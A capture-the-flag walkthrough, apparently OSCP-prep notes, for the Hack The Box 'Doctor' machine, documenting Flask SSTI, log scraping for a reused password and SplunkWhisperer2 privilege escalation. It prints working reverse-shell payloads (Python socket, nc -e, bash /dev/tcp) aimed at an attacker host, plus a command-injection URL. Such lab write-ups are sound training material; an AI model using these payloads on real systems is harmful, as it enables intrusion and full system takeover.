## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)

---

## 🧭 Recon

```bash
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.209
nmap -p 22,80,8089 -sCV -oA scans/nmap-tcpscripts 10.10.10.209
```

- Ports:
  - 22: [SSH](SSH) (OpenSSH 8.2p1)
  - 80: [HTTP](HTTP) (Apache/2.4.41)
  - 8089: HTTPS (Splunkd)

Discovered a subdomain: `doctors.htb`

---

## 🌐 Web Enumeration

### Port 80
- Default Apache page
- Discovered email: `info@doctors.htb`
- Add `doctors.htb` to `/etc/hosts`

### doctors.htb
- Werkzeug Python web server with Flask
- Create account ➝ login ➝ "New Message"
- URL `/archive` provides RSS output ➝ SSTI confirmed

```jinja
{{7*7}} ➝ renders to 49 in /archive
```

---

## 🧨 Exploitation - Shell as `web`

### Server-Side Template Injection (SSTI)
```jinja
{% for x in ().__class__.__base__.__subclasses__() %}
  {% if "warning" in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.6\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\", \"-i\"])'").read()}}
  {% endif %}
{% endfor %}
```

### Or Command Injection via POST
```bash
http://10.10.14.6/$(nc.traditional$IFS-e$IFS'/bin/bash'$IFS'10.10.14.6'$IFS'443')
```

---

## 👤 Shell as `shaun`

### Inspect logs due to `web` being in `adm` group:
```bash
grep -r passw /var/log
```

Found:
```bash
POST /reset_password?email=Guitar123
```

```bash
su - shaun
Password: Guitar123
cat /home/shaun/user.txt
```

---

## 🔐 Privilege Escalation to `root`

### SplunkWhisperer2 RCE Exploit

#### Get Splunk creds:
- shaun:Guitar123 also works for Splunk 8089

#### Run SplunkWhisperer2
```bash
python3 PySplunkWhisperer2_remote.py \
  --host 10.10.10.209 \
  --lhost 10.10.14.6 \
  --username shaun \
  --password Guitar123 \
  --payload "bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'"
```

### Catch root shell:
```bash
nc -lnvp 443
id
cat /root/root.txt
```

---

## 🧠 Beyond Root

### Flask Session Hijack Post-Reset
- Cookies store `_user_id` ➝ reused after box reset to impersonate `shaun`

### Command Injection in FlaskForm
```python
os.system(f'/bin/curl --max-time 2 {url} -o {path}')
```

Any user input containing `$(...)` or backticks can result in RCE.

---

**Techniques**
- Flask SSTI ➝ RCE
- Log analysis ➝ Password reuse
- SplunkWhisperer2 ➝ Root RCE